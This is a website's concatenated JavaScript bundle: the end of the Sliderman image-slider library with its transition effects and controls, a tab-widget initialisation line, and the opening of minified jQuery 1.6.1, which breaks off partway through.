					var style_c = [];
					if(frameN == effect.frames_count) style_c = styleEnd;
					else{
						foreach(styleDif, function(property){
							value = [];
							if(property == 'clip'){
								foreach(styleDif[property], function(n){
									value[n] = styleStart[property][n]+styleDif[property][n]*effect.easingArr[frameN]
								});
							}else value = styleStart[property]+styleDif[property]*effect.easingArr[frameN]
							style_c[property] = value;
						});
					}
					AnimateArr[cr].push(style_c);
				}

			}//for
			EffectsArr[effectsOptStr] = {startStylesArr: startStylesArr, AnimateArr: AnimateArr, needAnimate: needAnimate};
		}

		for(r = 0; r < effect.rows; r++) for(c = 0; c < effect.cols; c++){cr = r+','+c;
			if(parameters.contentmode){
				image = newElement('DIV', startStylesArr[cr]);
				image.appendChild(parameters.src.cloneNode(true));
			}else{
				image = newElement('IMG', startStylesArr[cr]);
				image.src = parameters.src;
			}
			var style = image.style;
			style.position = 'absolute';
			container.appendChild(image);
			AnimateItemsArr[cr] = style;
			if(!needAnimate[cr]) hide(AnimateItemsArr[cr]);
		}

		//ANIMATE
		var time_s = now();
		var framesCountAll = 1;
		foreach(AnimateArr, function(index){framesCountAll = Math.max(AnimateArr[index].length, framesCountAll);});
		var AnimateItem, AnimateItemsComplete = [], timerFuncStatus = true, timerFunc = function(){
			if(timerFuncStatus){
				var frameC = Math.ceil((now() - time_s) / effect.interval);
				frameC = frameC >= framesCountAll ? framesCountAll-1 : frameC-1;
				foreach(AnimateArr, function(index){
					AnimateItem = frameC > AnimateArr[index].length-1 ? AnimateArr[index].length-1 : frameC;
					if(AnimateArr[index][AnimateItem] && !AnimateItemsComplete[index+','+AnimateItem]){
						setStyles(AnimateItemsArr[index], AnimateArr[index][AnimateItem]);
						AnimateItemsComplete[index+','+AnimateItem] = true;
					}
				});
				if(frameC == framesCountAll-1){
					if(effect.count > 1){
						container.innerHTML = '';
						if(parameters.contentmode) container.appendChild(parameters.src);
						else container.innerHTML = '<img src="'+parameters.src+'" width="'+display.width+'" height="'+display.height+'" />';
					}
					parameters.callback(container);
					timerFuncStatus = false;
				}
			}
			return timerFuncStatus;
		};
		var animateInterval = setInterval(function(){
			if(!timerFunc()) clearInterval(animateInterval);
		}, effect.interval);

	}//Effects
	function getOrder(effect){
		var a = [], o, m = 0;
		if(effect.count > 1){
			o = getDefinedObject('order', effect.order);
			if(!is_array(o.cache)) o.cache = [];
			if(o.nocache || !o.cache[effect.order_cache_id]){
				a = o.method(effect);
				if(effect.reverse){
					foreach(a, function(i, v){m = Math.max(m, v);});
					foreach(a, function(i){a[i] = m - a[i];});
				}
				o.cache[effect.order_cache_id] = a;
			}
			a = o.cache[effect.order_cache_id];
		}else a['0,0'] = 0;
		return a;
	}//getOrder
	
	function getEasing(effect){
		var o = getDefinedObject('easing', effect.easing), i, c = effect.frames_count;
		if(!is_array(o.cache)) o.cache = [];
		if(!o.cache[c]){
			o.cache[c] = [];
			for(i = 1; i <= c; i++) o.cache[c][i] = o.method(i/c);
		}
		return o.cache[c];
	}//getEasing
	
	Sliderman.slider = function(parameters){
		setOpacityInit();

		var Slider = {}, current = null, previous = null, EffectN = 0, nextIndex = null, prevImg, status = 'free', isHover = false, images = [], descriptions = [], links = [], ef = function(){};

		//EVENTS
		var events = parameters.events, eventCall = events ? function(e){if(events[e] && is_function(events[e])) events[e](Slider);} : ef;
		var contentmode = parameters.contentmode;

		//SLIDER EFECTS
		var effects = [];
		var effectsNames = [];
		var addEffect = function(e){
			if(is_string(e)){
				e = e.split(',');
				if(e.length == 1){
					var globalEffect = getDefinedObject('effect', e[0]);
					if(globalEffect) addEffect(globalEffect);
				}else for(var i = 0; i < e.length; i++) addEffect(e[i]);
			}else if(e){
				e = EffectObject(e);
				var effectsId = array_search(effects, 'name', e.name);
				if(!effectsId) effectsId = effects.length;
				effectsNames.push(e.name);
				effects[effectsId] = array_copy(e);
			}
		}//addEffect
		var getEffect = function(){
			var n = 0;
			if(effects.length > 1){
				switch(display.effects_order){
					case 'slides': n = current % effectsNames.length; break;
					case 'effects': n = EffectN % effectsNames.length; break;
					default:/*random*/
						n = random(effectsNames.length);
				}
			}
			EffectN++;
			return effects[array_search(effects, 'name', effectsNames[n])];
		}//getEffect
		if(parameters.effects){
			if(!is_array(parameters.effects)) parameters.effects = [parameters.effects];
			for(var i = 0; i < parameters.effects.length; i++) addEffect(parameters.effects[i]);
		}else parameters.effects = [];
		if(!effects.length) effects = array_copy(getDefinedObjects('effect'));

		//OPTIONS
		var display = parameters.display || {};
		display.width = parameters.width;
		display.height = parameters.height;
		var loading = display.loading || {};
		var description = display.description || null;
		var navigation = display.navigation || null;
		var buttons = display.buttons || null;
		
		Slider.random = function(){
			var r = random(images.length);
			return images.length > 1 && r == current ? Slider.random() : Slider.go(r);
		}
		Slider.next = function(){
			var r = Slider.go(current === null ? 0 : current + 1);
			if(display.loop && r){
				autoplayCount++;
				if(autoplayCount+1 >= images.length*display.loop) autoplay = ef;
			}
			return r;
		}
		Slider.prev = function(){
			var r = Slider.go(current === null ? -1 : current - 1);
			if(display.loop && r) autoplayCount--;
			return r;
		}
		Slider.go = function(index){
			index = (images.length + index) % images.length;
			autoplay(false);
			if(status != 'free') nextIndex = index;
			if(status != 'free' || current == index) return autoplay(true) && false;
			previous = current;
			current = index;
			eventCall('loading');
			showLoading(true);
			if(contentmode) doEffect(images[current]);
			else loadImage(images[current], doEffect, display.always_show_loading);
			return true;
		}//go
		Slider.get = function(a){
			switch(a){
				case 'length': return images.length; break;
				case 'current': return current; break;
				case 'previous': return previous; break;
				case 'images': return images; break;
				case 'links': return links; break;
				case 'descriptions': return descriptions; break;
			}
		}//get
		var autoplayStatus = 'stop';//play,pause,stop
		Slider.play = function(){if(!display.autoplay) return;
			if(autoplayStatus != 'play'){
				var s = autoplayStatus == 'stop';
				autoplayStatus = 'play';
				if(s) (display.random ? Slider.random : Slider.go)(0);
				else autoplay(true);
			}
		}//play
		Slider.pause = function(){if(!display.autoplay) return;
			if(autoplayStatus == 'pause') Slider.play();
			else if(autoplayStatus == 'play'){
				autoplayStatus = 'pause';
				autoplay(false);
			}
		}//pause
		Slider.stop = function(){if(!display.autoplay) return;
			autoplayStatus = 'stop';
			current = null;
			previous = null;
			nextIndex = null;
			EffectN = 0;
			autoplay(false);
			removePrevImg();
			if(display.first_slide) displayFirstSlide();
			update();
		}//stop
		Slider.start = function(){if(!display.autoplay) return;
			Slider.stop();
			Slider.play();
		}//start
		
		var removePrevImg = function(){
			if(prevImg && status == 'free'){
				prevImg.parentNode.removeChild(prevImg);
				prevImg = null;
			}
		}//removePrevImg
		
		function displayFirstSlide(){
			var c = slideContainer(imagesCont, display);
			if(parameters.contentmode) c.appendChild(images[0]);
			else c.innerHTML = '<img src="'+images[0]+'" width="'+display.width+'" height="'+display.height+'" />';
			EffectN = 1;
			previous = null;
			current = 0;
		}//displayFirstSlide
		
		function update(){
			descriptionShow(); linkUpd(); navigationUpd();
		}//update

		var styleDef = {width: display.width, height: display.height, position: 'absolute', top: 0, left: 0, display: 'block'};

		var mainCont = document.getElementById(parameters.container);
		function addElementEventOnmouseover(){isHover = true;
			if(buttons && buttons.hide) show(buttonsCont.style);
			if(description && description.hide && !contentmode) show(descriptionCont.style);
			if(display.pause) autoplay(false);
		}
		addElementEvent(mainCont, 'onmouseover', addElementEventOnmouseover);
		function addElementEventOnmouseout(){isHover = false;
			if(buttons && buttons.hide) hide(buttonsCont.style);
			if(description && description.hide && !contentmode) hide(descriptionCont.style);
			if(display.pause) autoplay(true);
		}
		addElementEvent(mainCont, 'onmouseout', addElementEventOnmouseout);

		//GET CONTENT
		var maps = document.getElementsByTagName('MAP');
		for(var i = 0; i < mainCont.childNodes.length; i++) if(mainCont.childNodes[i].nodeType == 1){
			if(contentmode) images.push(mainCont.childNodes[i].cloneNode(true));
			else{
				switch(mainCont.childNodes[i].tagName){
					case 'A':
						var img = mainCont.childNodes[i].getElementsByTagName('IMG');
						if(img.length){
							images.push(img[0].src);
							links[images.length-1] = mainCont.childNodes[i];
						}else descriptions[images.length-1] = mainCont.childNodes[i];
					break;
					case 'IMG':
						images.push(mainCont.childNodes[i].src);
						if(mainCont.childNodes[i].useMap && maps.length) for(var m = 0; m < maps.length; m++){
							if(maps[m].name && mainCont.childNodes[i].useMap.replace(/^[^#]*#/, '') == maps[m].name) links[images.length-1] = maps[m];
						}
					break;
					case 'MAP': continue; break;
					default: descriptions[images.length-1] = mainCont.childNodes[i];
				}
			}
			hide(mainCont.childNodes[i].style);
		}
		if(!contentmode) for(var i = 0; i < images.length; i++) loadImage(images[i]);

		//CONTAINERS
		var sliderCont = newElement('DIV', {width: display.width, height: display.height, position: 'relative'}); mainCont.appendChild(sliderCont);
		var imagesCont = newElement('DIV', styleDef); sliderCont.appendChild(imagesCont);
		partsCont = sliderCont;

		//LINKS
		if(contentmode) var linkUpd = ef;
		else{
			var lnk = newElement('DIV', styleDef); partsCont.appendChild(lnk);
			var linkUpd = function(){
				lnk.innerHTML = ''; value = links[current];
				if(value){
					if(value.tagName == 'MAP'){
						var a = newElement('IMG', styleDef);
						a.src = images[current]; a.useMap = '#'+value.name;
					}else{
						var a = newElement('A', styleDef);
						a.href = value.href; a.target = value.target;
					}
					setStyles(a.style, {opacity: 0, background: '#000000'});
					a.onfocus = this_blur;
					lnk.appendChild(a);
				}
			}
		}

		//LOADING
		if(contentmode) var showLoading = ef;
		else{
			var loadingCont = newElement('DIV'); partsCont.appendChild(loadingCont);
			hide(loadingCont.style);
			if(loading.background){
				var loadingBgStyle = array_copy(styleDef);
				loadingBgStyle.background = loading.background;
				if(loading.opacity) loadingBgStyle.opacity = loading.opacity;
				loadingCont.appendChild(newElement('DIV', loadingBgStyle));
			}
			if(loading.image){
				var loadingImgStyle = array_copy(styleDef);
				loadingImgStyle.background = 'url('+(loading.image)+') no-repeat center center';
				loadingCont.appendChild(newElement('DIV', loadingImgStyle));
			}
			var showLoading = function(a){
				if(a) show(loadingCont.style);
				else hide(loadingCont.style);
				status = a ? 'loading' : 'free';
			}
		}

		//DESCRIPTION
		var descriptionShow;
		if(description && !contentmode){
			var descriptionCont = newElement('DIV'); partsCont.appendChild(descriptionCont);
			if(description.hide) hide(descriptionCont.style);

			var descriptionStl = {position: 'absolute', overflow: 'hidden', textAlign: 'left'};
			if(!description) description = [];
			description.position = validateOption(description.position, 'top,left,right,bottom')
			descriptionStl.background = description.background || 'white';
			descriptionStl.opacity = description.opacity || 0.5;
			descriptionStl.width = description.position == 'top' || description.position == 'bottom' ? display.width : description.width || display.width*0.2;
			descriptionStl.height = description.position == 'left' || description.position == 'right' ? display.height : description.height || display.height*0.2;
			descriptionStl[description.position == 'bottom'?'bottom':'top'] = 0;
			descriptionStl[description.position == 'right'?'right':'left'] = 0;

			var descBg = newElement('DIV', descriptionStl); descriptionCont.appendChild(descBg);
			descriptionStl.opacity = 1; descriptionStl.background = '';
			var desc = newElement('DIV', descriptionStl); descriptionCont.appendChild(desc);

			function descriptionShow(){
				desc.innerHTML = '';
				setStyle(descriptionCont.style, 'visibility', 'hidden');
				var value = descriptions[current];
				if(value){
					setStyle(descriptionCont.style, 'visibility', 'visible');
					value = value.cloneNode(true);
					show(value.style);
					desc.appendChild(value);
					if(isHover) show(descriptionCont.style);
				}
			}
		}else descriptionShow = ef

		//BUTTONS
		if(buttons){
			var buttonsCont = newElement('DIV'); partsCont.appendChild(buttonsCont);
			if(buttons.hide) hide(buttonsCont.style);
			var btnPrev = newElement('A'); buttonsCont.appendChild(btnPrev);
			btnPrev.href = 'javascript:void(0);';
			var btnNext = btnPrev.cloneNode(true); buttonsCont.appendChild(btnNext);
			btnPrev.onfocus = this_blur;
			btnNext.onfocus = this_blur;
			btnPrev.onclick = Slider.prev;
			btnNext.onclick = Slider.next;
			if(buttons.prev.label) btnPrev.innerHTML = is_string(buttons.prev.label) ? buttons.prev.label : 'prev';
			if(buttons.prev.label) btnNext.innerHTML = is_string(buttons.next.label) ? buttons.next.label : 'next';
			if(buttons.prev.className) btnPrev.className = buttons.prev.className;
			if(buttons.next.className) btnNext.className = buttons.next.className;
			if(buttons.opacity || buttons.prev.opacity) setOpacity(btnPrev.style, buttons.opacity || buttons.prev.opacity);
			if(buttons.opacity || buttons.next.opacity) setOpacity(btnNext.style, buttons.opacity || buttons.next.opacity);
		}

		//NAVIGATION
		var navigationUpd;
		if(navigation){
			var navigationCont = document.getElementById(navigation.container);
			var a;

			if(navigation.prev){
				a = newElement('A');
				if(navigation.prev.label) a.innerHTML = is_string(navigation.prev.label) ? navigation.prev.label : 'Prev';
				if(navigation.prev.className) a.className = navigation.prev.className;
				a.href = 'javascript:void(0);';
				a.onfocus = this_blur;
				a.onclick = Slider.prev;
				navigationCont.appendChild(a);
			}

			var navigationLinks = [];
			function a_onclick(){Slider.go(this.id.replace(parameters.container+'_SliderNavigation', ''));};
			for(var i = 0; i < images.length; i++){
				a = newElement('A');
				if(navigation.label) a.innerHTML = is_string(navigation.label) ? navigation.label : i+1;
				if(navigation.className) a.className = navigation.className;
				a.href = 'javascript:void(0);';
				a.id = parameters.container+'_SliderNavigation'+i;
				a.onfocus = this_blur;
				a.onclick = a_onclick;
				navigationLinks.push(a);
				navigationCont.appendChild(a);
			}

			if(navigation.next){
				a = newElement('A');
				if(navigation.next.label) a.innerHTML = is_string(navigation.next.label) ? navigation.next.label : 'Next';
				if(navigation.next.className) a.className = navigation.next.className;
				a.href = 'javascript:void(0);';
				a.onfocus = this_blur;
				a.onclick = Slider.next;
				navigationCont.appendChild(a);
			}

			function navigationUpd(){
				for(var i = 0; i < navigationLinks.length; i++) navigationLinks[i].className = navigationLinks[i].className.replace(/\bactive\b/g, '');
				if(navigationLinks[current]) navigationLinks[current].className += ' active';
			}
		}else navigationUpd = ef

		//AUTOPLAY
		var autoplayCount = 0;
		if(display.autoplay){
			var autoplayTimeout;
			var autoplay = function(a){
				if(autoplayTimeout){
					clearTimeout(autoplayTimeout);
					autoplayTimeout = null;
				}
				if(a && !(isHover && display.pause) && autoplayStatus == 'play') autoplayTimeout = setTimeout(display.random ? Slider.random : Slider.next, display.autoplay);
			}//autoplay
		}else var autoplay = ef

		var doEffect = function(src){
			if(autoplayStatus == 'stop') autoplayStatus = 'pause';
			eventCall('before');
			showLoading(false); status = 'busy'; update();
			Effects({effect: getEffect(), display: display, container: imagesCont, src: src, callback: function(img){
				status = 'free'; autoplay(true);
				removePrevImg();
				prevImg = img;
				eventCall('after');
				if(autoplayStatus == 'stop') removePrevImg();
				else if(nextIndex !== null){
					Slider.go(nextIndex);
					nextIndex = null;
				}
			}, contentmode: contentmode});
		};

		if(display.mousewheel){
			onmousewheel = function(d){
				if(d > 0) Slider.prev();
				else if(d < 0) Slider.next();
				return true;
			};
			function wheel(event){
				var d = 0;
				if(!event) event = window.event;
				if(event.wheelDelta){
					d = event.wheelDelta/120;
					if(window.opera) d = -d;
				}else if(event.detail) d = -event.detail/3;
				if(d && onmousewheel(d)){
					if(event.preventDefault) event.preventDefault();
					event.returnValue = false;
				}
			}//wheel
			if(mainCont.addEventListener){
				mainCont.addEventListener("DOMMouseScroll",wheel,false);
				mainCont.addEventListener("mousewheel",wheel,false);
			}else addElementEvent(mainCont, 'onmousewheel', wheel);
		}
		
		if(display.first_slide) displayFirstSlide();
		update();
		if(typeof(display.autostart) == 'undefined' || display.autostart) Slider.play();
		return Slider;
	}//Sliderman.slider
	

}//Sliderman

/* predefined easing functions */
Sliderman.easing({name: 'none', method: function(x){return x;}});
Sliderman.easing({name: 'swing', method: function(x){return -Math.cos(x*Math.PI)/2 + 0.5;}});
Sliderman.easing({name: 'wave', method: function(t){return ((Math.cos((1-t)*3*Math.PI+2*Math.PI))*0.5+0.5+t)/2;}});
Sliderman.easing({name: 'bounce', method: function(t){return 1 - Math.abs(Math.cos((1-t)*(2.5+t*t*3)*Math.PI+0.5*Math.PI)*(1-t));}});
/* predefined order functions */
Sliderman.order({name: 'straight', method: function(e){
	var cols = e.cols, rows = e.rows, road = e.road, count = e.count;
	var a = [], i = 0, c = 0, r = 0, cl = cols - 1, rl = rows - 1, il = count - 1, cr;
	for(r = 0; r < rows; r++) for(c = 0; c < cols; c++){cr = r+','+c;
		switch(road){
			case 'BL': a[cr] = il-(c*rows+(rl-r)); break;
			case 'RT': a[cr] = il-(r*cols+(cl-c)); break;
			case 'TL': a[cr] = il-(c*rows+r);
			case 'LT': a[cr] = il-(r*cols+c); break;
			case 'BR': a[cr] = c*rows+r; break;
			case 'LB': a[cr] = r*cols+(cl-c); break;
			case 'TR': a[cr] = c*rows+(rl-r); break;
			default: a[cr] = r*cols+c; break;//'RB'
		}
	}
	return a;
}});
Sliderman.order({name: 'swirl', method: function(e){
	var cols = e.cols, rows = e.rows, road = e.road, count = e.count;
	var a = [], i = 0, c = 0, r = 0, cl = cols - 1, rl = rows - 1, il = count - 1, cr;
	var courses, course = 0;
	switch(road){
		case 'BL': c = cl; r = 0; courses = ['r+', 'c-', 'r-', 'c+']; break;
		case 'RT': c = 0; r = rl; courses = ['c+', 'r-', 'c-', 'r+']; break;
		case 'TL': c = cl; r = rl; courses = ['r-', 'c-', 'r+', 'c+']; break;
		case 'LT': c = cl; r = rl; courses = ['c-', 'r-', 'c+', 'r+']; break;
		case 'BR': c = 0; r = 0; courses = ['r+', 'c+', 'r-', 'c-']; break;
		case 'LB': c = cl; r = 0; courses = ['c-', 'r+', 'c+', 'r-']; break;
		case 'TR': c = 0; r = rl; courses = ['r-', 'c+', 'r+', 'c-']; break;
		default: c = 0; r = 0; courses = ['c+', 'r+', 'c-', 'r-']; break;//'RB'
	}
	i = 0;
	while(i < count){
		cr = r+','+c;
		if(c >= 0 && c < cols && r >= 0 && r < rows && typeof(a[cr]) == 'undefined') a[cr] = i++;
		else switch(courses[course++%courses.length]){case 'c+': c--; break; case 'r+': r--; break; case 'c-': c++; break; case 'r-': r++; break;}
		switch(courses[course%courses.length]){case 'c+': c++; break; case 'r+': r++; break; case 'c-': c--; break; case 'r-': r--; break;}
	}
	return a;
}});
Sliderman.order({name: 'snake', method: function(e){
	var cols = e.cols, rows = e.rows, road = e.road, count = e.count;
	var a = [], i = 0, c = 0, r = 0, cl = cols - 1, rl = rows - 1, il = count - 1, cr;
	var courses, course = 0;
	switch(road){
		case 'BL': c = cl; r = 0; courses = ['r+', 'c-', 'r-', 'c-']; break;
		case 'RT': c = 0; r = rl; courses = ['c+', 'r-', 'c-', 'r-']; break;
		case 'TL': c = cl; r = rl; courses = ['r-', 'c-', 'r+', 'c-']; break;
		case 'LT': c = cl; r = rl; courses = ['c-', 'r-', 'c+', 'r-']; break;
		case 'BR': c = 0; r = 0; courses = ['r+', 'c+', 'r-', 'c+']; break;
		case 'LB': c = cl; r = 0; courses = ['c-', 'r+', 'c+', 'r+']; break;
		case 'TR': c = 0; r = rl; courses = ['r-', 'c+', 'r+', 'c+']; break;
		default: c = 0; r = 0; courses = ['c+', 'r+', 'c-', 'r+']; break;//'RB'
	}
	i = 0;
	while(i < count){cr = r+','+c;
		if(c >= 0 && c < cols && r >= 0 && r < rows && typeof(a[cr]) == 'undefined'){a[cr] = i++;
			switch(courses[course%courses.length]){case 'c+': c++; break; case 'r+': r++; break; case 'c-': c--; break; case 'r-': r--; break;}
		}
		else{
			switch(courses[course++%courses.length]){case 'c+': c--; break; case 'r+': r--; break; case 'c-': c++; break; case 'r-': r++; break;}
			switch(courses[course++%courses.length]){case 'c+': c++; break; case 'r+': r++; break; case 'c-': c--; break; case 'r-': r--; break;}
		}
	}
	return a;
}});
Sliderman.order({name: 'straight_stairs', method: function(e){
	var cols = e.cols, rows = e.rows, road = e.road, count = e.count;
	var a = [], i = 0, c = 0, r = 0, cl = cols - 1, rl = rows - 1, il = count - 1, cr;
	switch(road){
		case 'BL': case 'TR': case 'TL': case 'BR': var C = 0, R = 0; break;
		case 'LB': case 'RT': case 'LT': case 'RB': default: road = 'RB'; var C = cl, R = 0; break;
	}
	c = C; r = R;
	while(i < count){cr = r+','+c;
		if(road.indexOf('T') == 1 || road.indexOf('R') == 1) a[cr] = il - i++;
		else a[cr] = i++;
		switch(road){
			case 'BL': case 'TR': c--; r++; break;
			case 'TL': case 'BR': c++; r--; break;
			case 'LB': case 'RT': c--; r--; break;
			case 'RB': case 'LT': default: c++; r++; break;
		}
		if(c < 0 || r < 0 || c > cl || r > rl){
			switch(road){
				case 'BL': case 'TR': C++; break;
				case 'LB': case 'RT': case 'TL': case 'BR': R++; break;
				case 'RB': case 'LT': default: C--; break;
			}
			if(C < 0 || R < 0 || C > cl || R > rl){
				switch(road){
					case 'BL': case 'TR': C = cl; R++; break;
					case 'TL': case 'BR': R = rl; C++; break;
					case 'LB': case 'RT': R = rl; C--; break;
					case 'RB': case 'LT': default: C = 0; R++; break;
				}
				if(R > rl) R = rl; else if(R < 0) R = 0; else if(C > cl) C = cl; else if(C < 0) C = 0;
			}
			r = R; c = C;
		}
	}
	return a;
}});
Sliderman.order({name: 'square', method: function(effect){
	var cols = effect.cols || 1, rows = effect.rows || 1, arr = [], i = 0, c, r, dc, dr, cr;
	dc = cols < rows ? (rows-cols)/2 : 0; dr = cols > rows ? (cols-rows)/2 : 0; cr = Math.round(Math.max(cols/2, rows/2)) + 1;
	for(c = 0; c < cols; c++) for(r = 0; r < rows; r++) arr[r+','+c] = cr - Math.min(c+1+dc, r+1+dr, cols-c+dc, rows-r+dr);
	return arr;
}});
Sliderman.order({name: 'rectangle', method: function(effect){
	var cols = effect.cols || 1, rows = effect.rows || 1, arr = [], i = 0, c, r, cr;
	cr = Math.round(Math.min(cols/2, rows/2)) + 1;
	for(c = 0; c < cols; c++) for(r = 0; r < rows; r++) arr[r+','+c] = cr - Math.min(c+1, r+1, cols-c, rows-r);
	return arr;
}});
Sliderman.order({name: 'random', method: function(effect){
	var a = [], tmp = [], r, c, i;
	for(r = 0; r < effect.rows; r++) for(c = 0; c < effect.cols; c++) tmp.push(r+','+c);
	tmp.sort(function(a,b){return Math.random() > 0.5;});
	for(i = 0; i < effect.count; i++) a[tmp[i]] = i;
	return a;
}});
Sliderman.order({
	name: 'circle', method: function(effect){
  	var cols = effect.cols || 1, rows = effect.rows || 1, arr = [], i = 0, c, r;
  	var hc = cols/2-0.5, hr = rows/2-0.5;
		for(c = 0; c < cols; c++) for(r = 0; r < rows; r++) arr[r+','+c] = Math.round(Math.sqrt(Math.pow(c-hc, 2)+Math.pow(r-hr, 2)));
		return arr;
	}
});
Sliderman.order({
	name: 'cross', method: function(effect){
  	var cols = effect.cols || 1, rows = effect.rows || 1, arr = [], i = 0, c, r;
  	var hc = cols/2-0.5, hr = rows/2-0.5;
		for(c = 0; c < cols; c++) for(r = 0; r < rows; r++) arr[r+','+c] = Math.round(Math.min(Math.abs(c-hc), Math.abs(r-hr)));
		return arr;
	}
});
Sliderman.order({
	name: 'rectangle_cross', method: function(effect){
  	var cols = effect.cols || 1, rows = effect.rows || 1, arr = [], i = 0, c, r;
  	var hc = cols/2-0.5, hr = rows/2-0.5, cr = Math.max(hc, hr)+1;
		for(c = 0; c < cols; c++) for(r = 0; r < rows; r++) arr[r+','+c] = Math.round(cr-Math.max(hc-Math.abs(c-hc), hr-Math.abs(r-hr)))-1;
		return arr;
	}
});
/* predefined effects */
Sliderman.effect({name: 'fade', fade: true, duration: 400});
Sliderman.effect({name: 'move', left: true, move: true, duration: 400});
Sliderman.effect({name: 'stairs', cols: 7, rows: 5, delay: 30, order: 'straight_stairs', road: 'BL', fade: true});
Sliderman.effect({name: 'blinds', cols: 10, delay: 100, duration: 400, order: 'straight', right: true, zoom: true, fade: true});
Sliderman.effect({name: 'rain', cols: 10, delay: 100, duration: 400, order: 'straight', top: true, fade: true});


var delay = 10000;	var mypets=new ddtabcontent("pettabs");
	mypets.setpersist(true);
	mypets.setselectedClassTarget("link");
	mypets.init(delay);
/*!
 * jQuery JavaScript Library v1.6.1
 * http://jquery.com/
 *
 * Copyright 2011, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 * Copyright 2011, The Dojo Foundation
 * Released under the MIT, BSD, and GPL Licenses.
 *
 * Date: Thu May 12 15:04:36 2011 -0400
 */
(function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cv(a){if(!cj[a]){var b=f("<"+a+">").appendTo("body"),d=b.css("display");b.remove();if(d==="none"||d===""){ck||(ck=c.createElement("iframe"),ck.frameBorder=ck.width=ck.height=0),c.body.appendChild(ck);if(!cl||!ck.createElement)cl=(ck.contentWindow||ck.contentDocument).document,cl.write("<!doctype><html><body></body></html>");b=cl.createElement(a),cl.body.appendChild(b),d=f.css(b,"display"),c.body.removeChild(ck)}cj[a]=d}return cj[a]}function cu(a,b){var c={};f.each(cp.concat.apply([],cp.slice(0,b)),function(){c[this]=a});return c}function ct(){cq=b}function cs(){setTimeout(ct,0);return cq=f.now()}function ci(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ch(){try{return new a.XMLHttpRequest}catch(b){}}function cb(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function ca(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function b_(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bF.test(a)?d(a,e):b_(a+"["+(typeof e=="object"||f.isArray(e)?b:"")+"]",e,c,d)});else if(!c&&b!=null&&typeof b=="object")for(var e in b)b_(a+"["+e+"]",b[e],c,d);else d(a,b)}function b$(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bU,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=b$(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=b$(a,c,d,e,"*",g));return l}function bZ(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bQ),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bD(a,b,c){var d=b==="width"?bx:by,e=b==="width"?a.offsetWidth:a.offsetHeight;if(c==="border")return e;f.each(d,function(){c||(e-=parseFloat(f.css(a,"padding"+this))||0),c==="margin"?e+=parseFloat(f.css(a,"margin"+this))||0:e-=parseFloat(f.css(a,"border"+this+"Width"))||0});return e}function bn(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bf,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function bm(a){f.nodeName(a,"input")?bl(a):a.getElementsByTagName&&f.grep(a.getElementsByTagName("input"),bl)}function bl(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bk(a){return"getElementsByTagName"in a?a.getElementsByTagName("*"):"querySelectorAll"in a?a.querySelectorAll("*"):[]}function bj(a,b){var c;if(b.nodeType===1){b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(f.expando)}}function bi(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c=f.expando,d=f.data(a),e=f.data(b,d);if(d=d[c]){var g=d.events;e=e[c]=f.extend({},d);if(g){delete e.handle,e.events={};for(var h in g)for(var i=0,j=g[h].length;i<j;i++)f.event.add(b,h+(g[h][i].namespace?".":"")+g[h][i].namespace,g[h][i],g[h][i].data)}}}}function bh(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function X(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(S.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function W(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function O(a,b){return(a&&a!=="*"?a+".":"")+b.replace(A,"`").replace(B,"&")}function N(a){var 